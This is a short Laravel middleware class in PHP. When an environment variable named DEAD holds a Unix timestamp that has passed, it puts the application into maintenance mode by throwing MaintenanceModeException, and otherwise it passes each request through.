<?php

namespace Vas\Http\Middleware;

use Carbon\Carbon;
use Closure;
use Illuminate\Foundation\Http\Exceptions\MaintenanceModeException;

class KillerFeatureMiddleware
{
    /**
     * Handle an incoming request.
     *
     * @param  \Illuminate\Http\Request $request
     * @param  \Closure $next
     * @return mixed
     */
    public function handle($request, Closure $next)
    {
        if (env('DEAD') && Carbon::createFromTimestamp(env('DEAD'))->isPast()) {
            throw new MaintenanceModeException(time());
        }

        return $next($request);
    }
}
